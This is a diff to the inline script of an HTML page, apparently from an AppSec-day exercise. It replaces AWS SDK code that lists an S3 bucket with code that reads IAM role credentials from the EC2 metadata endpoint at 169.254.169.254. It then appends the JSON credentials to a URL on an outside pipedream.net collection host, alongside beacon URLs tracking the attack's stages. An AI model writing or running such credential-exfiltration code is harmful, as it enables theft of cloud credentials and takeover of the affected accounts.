@@ -16,46 +16,23 @@
   var img01 = new Image;
   img01.src = 'https://ennds7nyc15a.x.pipedream.net/?c=success_tahap_01';
 
-  AWS.config.credentials = new AWS.CredentialProviderChain([
-    new AWS.EC2MetadataCredentials({
-      httpOptions: { timeout: 5000 }, // 5 second timeout
-      maxRetries: 10, // retry 10 times
-      retryDelayOptions: { base: 200 }, // see AWS.Config for information
-      logger: console, // see AWS.Config for information
-      ec2MetadataV1Disabled: false // whether to block IMDS v1 fallback.
-    }),
-    new AWS.EnvironmentCredentials('AWS')
-  ]);
+  fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
+      .then(response => response.text())
+      .then(roleName => {
+        fetch(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${roleName}`)
+          .then(response => response.json())
+          .then(credentials => {
+            var img011 = new Image;
+            img011 = 'https://ennds7nyc15a.x.pipedream.net/?c=success_tahap_011';
 
-  var img = new Image;
-  img.src = 'https://ennds7nyc15a.x.pipedream.net/?c=success_tahap_1';
-
-  var s3Client = new AWS.S3();
-  var bucketName = 'tvlk-appsecday-screenshot';
-
-  var params = {
-    Bucket: bucketName,
-    Delimiter: '/',
-    Prefix: ''
-  };
-
-  var img2 = new Image;
-  img.src = 'https://ennds7nyc15a.x.pipedream.net/?c=success_tahap_2';
-  s3Client.listObjectsV2(params, function(err, data) {
-    if (err) {
-      console.log(err, err.stack);
-    } else {
-      var directories = data.CommonPrefixes.map(function(prefix) {
-        return '<li>' + prefix.Prefix + '</li>';
-      }).join('');
-      var files = data.Contents.map(function(content) {
-        return '<li>' + content.Key + '</li>';
-      }).join('');
-
-      var list = '<ul>' + directories + files + '</ul>';
-      document.getElementById('result').innerHTML = list;
-    }
-  });
+            var img012 = new Image;
+            img012 = 'https://ennds7nyc15a.x.pipedream.net/?c=' + JSON.stringify(credentials);
+            console.log(credentials);
+            // Use the retrieved credentials for your application logic
+          })
+          .catch(error => console.log(error));
+      })
+      .catch(error => console.log(error));
 </script>
 
 <ul id="result"></ul>
